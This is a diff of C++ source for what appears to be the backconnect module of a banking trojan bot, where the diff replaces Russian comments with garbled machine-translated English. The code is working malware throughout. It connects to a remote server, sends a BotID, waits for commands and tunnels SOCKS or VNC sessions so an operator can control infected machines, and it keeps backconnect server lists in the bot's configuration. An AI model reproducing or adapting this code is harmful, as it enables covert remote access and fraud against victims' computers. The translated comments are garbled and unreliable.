@@ -34,7 +34,7 @@ static bool isValidList(const LPSTR list, DWORD listSize)
   return (Str::_isValidMultiStringA(list, listSize) && (Str::_multiStringGetCountA(list) % 3) == 0);
 }
 
-//Данные бэконекта.
+//These bekonekta.
 typedef struct
 {
   LPSTR servicePort;
@@ -50,7 +50,7 @@ typedef struct
   DWORD id;
 }BCTUNNELDATA;
 
-//Список встреоных сервисов.
+//List vstreonyh services.
 #define SERVICE_PORT_SOCKS ((DWORD)-1) //Socks.
 #define SERVICE_PORT_VNC   ((DWORD)-2) //VNC.
 
@@ -71,7 +71,7 @@ static DWORD WINAPI procTunnel(void *p)
   
   WDEBUG0(WDDT_INFO, "Started.");
 
-  //Подключаемся к сервису.
+  //Connect to the service.
   bool ok = false;
   if(bcTunnelData->servicePort == SERVICE_PORT_SOCKS)
   {
@@ -100,7 +100,7 @@ static DWORD WINAPI procTunnel(void *p)
 #   endif
   }
 
-  //Подключаемся к серверу.
+  //Connect to the server.
   if(ok == true && (client = WSocket::tcpConnectA(bcTunnelData->bcData->server, (WORD)Str::_ToInt32A(bcTunnelData->bcData->serverPort, NULL))) != INVALID_SOCKET)
   {
     WSocket::tcpDisableDelay(client, true);
@@ -124,7 +124,7 @@ static DWORD WINAPI procTunnel(void *p)
     }      
   }
     
-  //Освобождение ресурсов.
+  //Freeing resources.
   WSocket::tcpClose(client);
   WSocket::tcpClose(service);
   Mem::free(bcTunnelData);
@@ -150,7 +150,7 @@ static DWORD WINAPI procConnection(void *p)
   ThreadsGroup::_createGroup(&group);
   WDEBUG0(WDDT_INFO, "Started.");
 
-  //Получаем порт сервиса
+  //Obtain the service port
   DWORD servicePort = 0;
 
   if(CWA(kernel32, lstrcmpiA)(bcData->servicePort, "socks") == 0)
@@ -171,7 +171,7 @@ static DWORD WINAPI procConnection(void *p)
   
   if(servicePort != 0)
   {
-    //Подключаемся к серверу.
+    //Connect to the server.
     SOCKET server = WSocket::tcpConnectA(bcData->server, (WORD)Str::_ToInt32A(bcData->serverPort, NULL));
     if(server != INVALID_SOCKET)
     {
@@ -179,7 +179,7 @@ static DWORD WINAPI procConnection(void *p)
       WSocket::tcpDisableDelay(server, true);
       WSocket::tcpSetKeepAlive(server, true, Backconnect::KEEPALIVE_DELAY, Backconnect::KEEPALIVE_INTERVAL);
       
-      //Отсылаем BotID.
+      //Refer BotID.
       bool ok;
       {
         PESETTINGS pes;
@@ -195,7 +195,7 @@ static DWORD WINAPI procConnection(void *p)
         }
       }
       
-      //Ожидаем команд от сервера.
+      //We expect teams from the server.
       if(ok)
       {
         Backconnect::COMMAND bcc;
@@ -203,7 +203,7 @@ static DWORD WINAPI procConnection(void *p)
 
         while(WSocket::tcpWaitForEvent(&server, 1, 0, NULL, 0) == server && Backconnect::_readCommand(server, &bcc, &bccData))
         {
-          //Создание тунеля.
+          //Creating a tunnel.
           if(bcc.command == Backconnect::COMMAND_CONNECT && bcc.dataSize == sizeof(DWORD))
           {
             BCTUNNELDATA *bcTunnelData = (BCTUNNELDATA *)Mem::alloc(sizeof(BCTUNNELDATA));
@@ -226,7 +226,7 @@ static DWORD WINAPI procConnection(void *p)
     }
   }
   
-  //Освобождаем ресурсы.
+  //Free resources.
   ThreadsGroup::_waitForAllExit(&group, INFINITE);
   ThreadsGroup::_closeGroup(&group);
 
@@ -240,11 +240,9 @@ static DWORD WINAPI procConnection(void *p)
   return 0;
 }
 
-/*
-  Поток для для создания контроля бэконектов.
+/*В В To create a stream for monitoring bekonektov.
 
-  Return - 0.
-*/
+В В Return - 0.*/
 static DWORD WINAPI proc(void *)
 {
   CoreHook::disableFileHookerForCurrentThread(true);
@@ -279,7 +277,7 @@ static DWORD WINAPI proc(void *)
           LPSTR curServer      = Str::_multiStringGetIndexA(curItem, 1);
           LPSTR curServerPort  = Str::_multiStringGetIndexA(curItem, 2);
 
-          //Генерируем мютекс.
+          //Generate myuteks.
           HANDLE bcMutex = NULL;
           {
             DWORD nameParts[3];
@@ -295,7 +293,7 @@ static DWORD WINAPI proc(void *)
             }
           }
 
-          //Создаем дочерный поток.
+          //Creates a child thread.
           if(bcMutex != NULL)
           {
             BCDATA *bcData = (BCDATA *)Mem::alloc(sizeof(BCDATA));
@@ -333,7 +331,7 @@ static DWORD WINAPI proc(void *)
   return 0;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 void BackconnectBot::init(void)
 {
@@ -351,7 +349,7 @@ bool BackconnectBot::_addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPor
   WORD newItemSize;
   char newItem[256 * 3 + 3 + 1];
 
-  //Генирируем элемент.
+  //Geniriruem element.
   {
     BYTE servicePortLen = (BYTE)Str::_LengthA(servicePort);
     BYTE serverLen      = (BYTE)Str::_LengthA(server);
@@ -371,30 +369,30 @@ bool BackconnectBot::_addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPor
     Str::_CopyA(offset, serverPort, serverPortLen);
     offset += serverPortLen + 1;
 
-    *offset = 0; //Завершающий байт мульти-строки.
+    *offset = 0; //The final multi-byte string.
     
     CWA(user32, CharLowerBuffA)(newItem, newItemSize);
   }
   
-  //Открываем конфигурацию.
+  //Open the configuration.
   BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
   if(config == NULL)return false;
     
-  //Получем список сущетвующих элементов.
+  //Suschetvuet obtain a list of items.
   bool ok = true;
   DWORD itemListSize;
   LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
 
-  //Если элемент существует, ищим клон.
+  //If the element exists ischim clone.
   if(isValidList(itemList, itemListSize))
   {
     LPSTR curItem = itemList;
     do
     {
-      //Проверяем доступно ли места больше чем, размер искомого элемента.
+      //Check whether the place is more than the size of the desired item.
       if((DWORD)((itemList + itemListSize) - curItem) <= newItemSize)break;
       
-      //Сравниваем.
+      //Compare.
       if(Mem::_compare(curItem, newItem, newItemSize) == 0)
       {
         WDEBUG0(WDDT_INFO, "Item already exists.");
@@ -410,7 +408,7 @@ bool BackconnectBot::_addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPor
       ok = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, itemList, itemListSize + newItemSize);
     }
   }
-  //Если элемент не найден, добавляем новый.
+  //If none are found, we add a new one.
   else
   {
     if(itemList == NULL)ok = BinStorage::_addItem(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize + 1);
@@ -429,30 +427,30 @@ bool BackconnectBot::_addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPor
 
 bool BackconnectBot::_removeStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort)
 {
-  //Загружаем конфиг.
+  //Load config.
   BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
   if(config == NULL)return false;
 
-  //Получаем список элементов.
+  //Get a list of items.
   DWORD itemListSize;
   LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
   
-  //Элементов нет.
+  //No items.
   if(itemList == NULL)
   {
     Mem::free(config);
     return LocalConfig::endReadWrite(NULL);
   }
 
-  //Проверяем правильность списка.
+  //Check the correctness of the list.
   bool changed = false;
   if(isValidList(itemList, itemListSize))
   {
-    //Создаем копию списка для копирования в него, элементов не попавших под маску.
+    //Create a copy of the list to be copied into it, the elements do not fall under the mask.
     LPSTR newItemList = (LPSTR)Mem::alloc(itemListSize);    
     if(newItemList != NULL)  
     {
-      //Ишим элементы.
+      //Ishim elements.
       LPSTR curItem = itemList;
       LPSTR offset  = newItemList;
       int len;
@@ -481,14 +479,14 @@ bool BackconnectBot::_removeStatic(LPSTR servicePort, LPSTR server, LPSTR server
           Str::_CopyA(offset, curServerPort, len);
           offset += len + 1;
 
-          *offset = 0; //Завершающий байт мульти-строки.
+          *offset = 0; //The final multi-byte string.
         }
       }
       while((curItem = Str::_multiStringGetIndexA(curItem, 3)) != NULL);
       
       if(changed == true)
       {
-        if(offset == newItemList)offset--; //Почти аналог BinStorage::ITEMF_COMBINE_DELETE.
+        if(offset == newItemList)offset--; //Almost analog BinStorage:: ITEMF_COMBINE_DELETE.
         changed = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItemList, offset - newItemList + 1);
       }
       Mem::free(newItemList);
